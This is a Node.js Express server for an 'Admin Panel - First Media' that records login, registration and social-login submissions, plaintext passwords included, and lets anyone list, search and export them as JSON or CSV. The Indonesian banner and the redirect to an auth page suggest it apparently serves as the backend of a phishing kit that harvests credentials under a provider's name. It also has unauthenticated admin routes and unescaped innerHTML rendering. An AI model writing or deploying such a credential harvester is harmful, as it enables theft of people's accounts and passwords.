const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Serve all files from current directory

// Create data directory if it doesn't exist
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir);
}

// Store user data
let userData = [];

// Routes
app.get('/', (req, res) => {
    res.redirect('/auth.html');
});

app.get('/admin', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Panel - First Media</title>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {
                    font-family: Arial, sans-serif;
                    margin: 0;
                    padding: 20px;
                    background: #f5f5f5;
                }
                .container {
                    max-width: 1200px;
                    margin: 0 auto;
                    background: white;
                    border-radius: 10px;
                    padding: 20px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }
                h1 {
                    color: #333;
                    text-align: center;
                    margin-bottom: 30px;
                }
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    background: #007bff;
                    color: white;
                    padding: 20px;
                    border-radius: 8px;
                    text-align: center;
                }
                .stat-card h3 {
                    margin: 0 0 10px 0;
                    font-size: 24px;
                }
                .stat-card p {
                    margin: 0;
                    font-size: 14px;
                }
                .data-table {
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 20px;
                }
                .data-table th,
                .data-table td {
                    padding: 12px;
                    text-align: left;
                    border-bottom: 1px solid #ddd;
                }
                .data-table th {
                    background: #f8f9fa;
                    font-weight: bold;
                }
                .data-table tr:hover {
                    background: #f5f5f5;
                }
                .btn {
                    background: #007bff;
                    color: white;
                    border: none;
                    padding: 10px 20px;
                    border-radius: 5px;
                    cursor: pointer;
                    margin: 5px;
                }
                .btn:hover {
                    background: #0056b3;
                }
                .btn-danger {
                    background: #dc3545;
                }
                .btn-danger:hover {
                    background: #c82333;
                }
                .filter-section {
                    margin-bottom: 20px;
                    padding: 15px;
                    background: #f8f9fa;
                    border-radius: 5px;
                }
                .filter-section select,
                .filter-section input {
                    padding: 8px;
                    margin: 5px;
                    border: 1px solid #ddd;
                    border-radius: 4px;
                }
                .export-section {
                    margin-top: 20px;
                    text-align: center;
                }
                .nav-links {
                    text-align: center;
                    margin-bottom: 20px;
                }
                .nav-links a {
                    color: #007bff;
                    text-decoration: none;
                    margin: 0 10px;
                    padding: 8px 16px;
                    border: 1px solid #007bff;
                    border-radius: 5px;
                    transition: all 0.3s ease;
                }
                .nav-links a:hover {
                    background: #007bff;
                    color: white;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Admin Panel - First Media</h1>
                
                <div class="nav-links">
                    <a href="/auth.html">Auth Page</a>
                    <a href="/Login.html">Home Page</a>
                    <a href="/dashboard.html">Dashboard</a>
                </div>
                
                <div style="background: #e7f3ff; padding: 15px; border-radius: 5px; margin-bottom: 20px; border-left: 4px solid #007bff;">
                    <strong>📊 Data Collection Info:</strong> Semua data login dan register termasuk password akan tersimpan di sini. Data dapat diexport ke JSON/CSV.
                </div>
                
                <div class="stats">
                    <div class="stat-card">
                        <h3 id="totalUsers">0</h3>
                        <p>Total Users</p>
                    </div>
                    <div class="stat-card">
                        <h3 id="totalLogins">0</h3>
                        <p>Total Logins</p>
                    </div>
                    <div class="stat-card">
                        <h3 id="totalRegistrations">0</h3>
                        <p>Total Registrations</p>
                    </div>
                    <div class="stat-card">
                        <h3 id="totalSocial">0</h3>
                        <p>Social Logins</p>
                    </div>
                </div>

                <div class="filter-section">
                    <h3>Filter Data</h3>
                    <select id="typeFilter">
                        <option value="">All Types</option>
                        <option value="login">Login</option>
                        <option value="register">Register</option>
                        <option value="google_login">Google Login</option>
                        <option value="facebook_login">Facebook Login</option>
                        <option value="instagram_login">Instagram Login</option>
                        <option value="social_login">Social Login</option>
                        <option value="social_register">Social Register</option>
                        <option value="forgot_password">Forgot Password</option>
                    </select>
                    <input type="text" id="searchInput" placeholder="Search by username, email, name, password, or provider...">
                    <button class="btn" onclick="filterData()">Filter</button>
                    <button class="btn" onclick="clearFilter()">Clear</button>
                </div>

                <table class="data-table">
                    <thead>
                        <tr>
                            <th>Timestamp</th>
                            <th>Type</th>
                            <th>Username</th>
                            <th>Email</th>
                            <th>Name</th>
                            <th>Phone</th>
                            <th>Password</th>
                            <th>Provider</th>
                            <th>User Agent</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="dataTableBody">
                        <!-- Data will be populated here -->
                    </tbody>
                </table>

                <div class="export-section">
                    <button class="btn" onclick="exportData()">Export to JSON</button>
                    <button class="btn" onclick="exportCSV()">Export to CSV</button>
                    <button class="btn btn-danger" onclick="clearAllData()">Clear All Data</button>
                </div>
            </div>

            <script>
                let allData = [];
                let filteredData = [];

                // Load data on page load
                window.onload = function() {
                    loadData();
                };

                function loadData() {
                    fetch('/api/data')
                        .then(response => response.json())
                        .then(data => {
                            allData = data;
                            filteredData = data;
                            updateStats();
                            renderTable();
                        })
                        .catch(error => console.error('Error loading data:', error));
                }

                function updateStats() {
                    const totalUsers = allData.length;
                    const totalLogins = allData.filter(item => item.type === 'login').length;
                    const totalRegistrations = allData.filter(item => item.type === 'register').length;
                    const totalSocial = allData.filter(item => 
                        item.type === 'social_login' || item.type === 'social_register'
                    ).length;

                    document.getElementById('totalUsers').textContent = totalUsers;
                    document.getElementById('totalLogins').textContent = totalLogins;
                    document.getElementById('totalRegistrations').textContent = totalRegistrations;
                    document.getElementById('totalSocial').textContent = totalSocial;
                }

                function renderTable() {
                    const tbody = document.getElementById('dataTableBody');
                    tbody.innerHTML = '';

                    filteredData.forEach((item, index) => {
                        const row = document.createElement('tr');
                        row.innerHTML = \`
                            <td>\${new Date(item.timestamp).toLocaleString()}</td>
                            <td>\${item.type}</td>
                            <td>\${item.data?.username || '-'}</td>
                            <td>\${item.data?.email || '-'}</td>
                            <td>\${item.data?.name || '-'}</td>
                            <td>\${item.data?.phone || '-'}</td>
                            <td>\${item.data?.password || '-'}</td>
                            <td>\${item.data?.provider || '-'}</td>
                            <td>\${item.data?.userAgent ? item.data.userAgent.substring(0, 50) + '...' : '-'}</td>
                            <td>
                                <button class="btn" onclick="viewDetails(\${index})">View</button>
                                <button class="btn btn-danger" onclick="deleteItem(\${index})">Delete</button>
                            </td>
                        \`;
                        tbody.appendChild(row);
                    });
                }

                function filterData() {
                    const typeFilter = document.getElementById('typeFilter').value;
                    const searchInput = document.getElementById('searchInput').value.toLowerCase();

                    filteredData = allData.filter(item => {
                        const matchesType = !typeFilter || item.type === typeFilter;
                        const matchesSearch = !searchInput || 
                            (item.data?.username && item.data.username.toLowerCase().includes(searchInput)) ||
                            (item.data?.email && item.data.email.toLowerCase().includes(searchInput)) ||
                            (item.data?.name && item.data.name.toLowerCase().includes(searchInput)) ||
                            (item.data?.password && item.data.password.toLowerCase().includes(searchInput)) ||
                            (item.data?.provider && item.data.provider.toLowerCase().includes(searchInput));
                        
                        return matchesType && matchesSearch;
                    });

                    renderTable();
                }

                function clearFilter() {
                    document.getElementById('typeFilter').value = '';
                    document.getElementById('searchInput').value = '';
                    filteredData = allData;
                    renderTable();
                }

                function viewDetails(index) {
                    const item = filteredData[index];
                    alert(JSON.stringify(item, null, 2));
                }

                function deleteItem(index) {
                    if (confirm('Are you sure you want to delete this item?')) {
                        const item = filteredData[index];
                        fetch('/api/data', {
                            method: 'DELETE',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(item)
                        })
                        .then(response => response.json())
                        .then(result => {
                            loadData();
                        })
                        .catch(error => console.error('Error deleting item:', error));
                    }
                }

                function exportData() {
                    const dataStr = JSON.stringify(filteredData, null, 2);
                    const dataBlob = new Blob([dataStr], {type: 'application/json'});
                    const url = URL.createObjectURL(dataBlob);
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = 'firstmedia_data.json';
                    link.click();
                }

                function exportCSV() {
                    let csv = 'Timestamp,Type,Username,Email,Name,Phone,Password,Provider,User Agent\\n';
                    
                    filteredData.forEach(item => {
                        const row = [
                            new Date(item.timestamp).toLocaleString(),
                            item.type,
                            item.data?.username || '',
                            item.data?.email || '',
                            item.data?.name || '',
                            item.data?.phone || '',
                            item.data?.password || '',
                            item.data?.provider || '',
                            item.data?.userAgent || ''
                        ].map(field => \`"\${field}"\`).join(',');
                        csv += row + '\\n';
                    });

                    const dataBlob = new Blob([csv], {type: 'text/csv'});
                    const url = URL.createObjectURL(dataBlob);
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = 'firstmedia_data.csv';
                    link.click();
                }

                function clearAllData() {
                    if (confirm('Are you sure you want to clear all data? This action cannot be undone.')) {
                        fetch('/api/data', {
                            method: 'DELETE'
                        })
                        .then(response => response.json())
                        .then(result => {
                            loadData();
                        })
                        .catch(error => console.error('Error clearing data:', error));
                    }
                }

                // Auto refresh every 30 seconds
                setInterval(loadData, 30000);
            </script>
        </body>
        </html>
    `);
});

// API Routes
app.post('/admin', (req, res) => {
    const data = req.body;
    
    // Add timestamp if not present
    if (!data.timestamp) {
        data.timestamp = new Date().toISOString();
    }

    // Store data
    userData.push(data);

    // Save to file
    saveDataToFile();

    console.log('Received data:', data);
    
    res.json({
        success: true,
        message: 'Data received successfully',
        timestamp: data.timestamp
    });
});

app.get('/api/data', (req, res) => {
    res.json(userData);
});

app.delete('/api/data', (req, res) => {
    if (req.body) {
        // Delete specific item
        const index = userData.findIndex(item => 
            item.timestamp === req.body.timestamp && 
            item.type === req.body.type
        );
        if (index > -1) {
            userData.splice(index, 1);
        }
    } else {
        // Clear all data
        userData = [];
    }
    
    saveDataToFile();
    res.json({ success: true, message: 'Data deleted successfully' });
});

function saveDataToFile() {
    const filePath = path.join(dataDir, 'user_data.json');
    fs.writeFileSync(filePath, JSON.stringify(userData, null, 2));
}

function loadDataFromFile() {
    const filePath = path.join(dataDir, 'user_data.json');
    if (fs.existsSync(filePath)) {
        try {
            userData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
        } catch (error) {
            console.error('Error loading data from file:', error);
            userData = [];
        }
    }
}

// Load existing data on startup
loadDataFromFile();

app.listen(PORT, () => {
    console.log(`🚀 Unified server running on http://172.15.1.21:${PORT}`);
    console.log(`🔐 Login Page (Main): http://172.15.1.21:${PORT}/auth.html`);
    console.log(`📊 Admin Panel: http://172.15.1.21:${PORT}/admin`);
    console.log(`🏠 Old Home Page: http://172.15.1.21:${PORT}/Login.html`);
    console.log(`📱 Dashboard: http://172.15.1.21:${PORT}/dashboard.html`);
    console.log('Data will be saved to ./data/user_data.json');
}); 